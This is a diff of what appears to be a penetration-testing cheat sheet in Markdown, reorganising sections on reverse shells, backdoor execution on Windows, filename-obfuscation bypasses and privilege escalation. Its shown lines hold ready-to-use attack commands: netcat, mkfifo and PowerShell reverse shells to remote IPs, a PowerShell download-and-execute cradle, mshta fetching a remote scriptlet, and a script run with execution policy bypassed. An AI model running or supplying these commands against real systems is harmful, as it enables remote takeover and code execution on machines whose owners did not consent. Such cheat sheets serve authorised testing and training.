@@ -203,7 +203,7 @@ vi: :set shell=/bin/bash:shell
 nmap: !sh
 ```
 ## Netcat
-Reverse shell\
+Reverse shell
 ```
 nc 172.16.1.100 443 -e /bin/sh
 nc.exe -e cmd.exe 172.16.1.100 443
@@ -215,7 +215,7 @@ nc -w 3 10.0.0.1 443 < in.file
 ```
 
 
-## Shell without Netcat
+## Reverse shell without Netcat
 Basic linux
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
@@ -256,7 +256,52 @@ echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/Power
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-# Windows Execution of backdoors
+
+
+<br /><br />
+
+
+
+
+
+# Windows Server 
+
+## Bloodhound
+https://github.com/CompassSecurity/BloodHoundQueries
+
+## CVE's
+
+## Crackmapexec
+
+## Responder
+
+
+# Windows Local
+## Directory and file notations
+Directory/file name bypasses
+```
+C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
+C:\>powershell C:\*\*2\n??e*d.* notepad.exe
+C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
+```
+8.3 / Short filename notation
+```
+dir /a:h /x
+for %A in (*.*) do @echo %~nsA %~nA
+
+C:\>dir /a:h /x
+                                        *
+13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
+13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
+13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)
+
+C:\>for %A in (*.*) do @echo %~nsA %~nA
+$WINDOWS $WINDOWS
+DOCUME~1 Documents and Settings
+NVIDIA~1 NVIDIA Corporation
+SYSTEM~1 System Volume Information
+```
+# Execution of backdoors
 ## MSHTA
 ```
 mshta.exe vbscript:Close(Execute("GetObject(""script:http://127.0.0.1:4444/payload.sct"")"))
@@ -445,46 +490,6 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 
-<br /><br />
-
-
-
-
-
-
-
-
-# Windows Server
-
-## Bloodhound
-
-https://github.com/CompassSecurity/BloodHoundQueries
-
-
-# Windows Local
-Directory name bypasses:
-```
-C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
-C:\>powershell C:\*\*2\n??e*d.* notepad.exe
-C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
-```
-8.3 / Short filename notation:
-```
-dir /a:h /x
-for %A in (*.*) do @echo %~nsA %~nA
-
-C:\>dir /a:h /x
-                                        *
-13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
-13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
-13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)
-
-C:\>for %A in (*.*) do @echo %~nsA %~nA
-$WINDOWS $WINDOWS
-DOCUME~1 Documents and Settings
-NVIDIA~1 NVIDIA Corporation
-SYSTEM~1 System Volume Information
-```
 # Windows Privilige Escalation
 
 Get hash of current user
@@ -506,6 +511,6 @@ https://github.com/S3cur3Th1sSh1t/PowerSharpPack
  # Physical attacks
   
   
- ## BIOS
+ # BIOS
  https://github.com/skysafe/reblog/blob/main/0000-defeating-a-laptops-bios-password/README.md
 
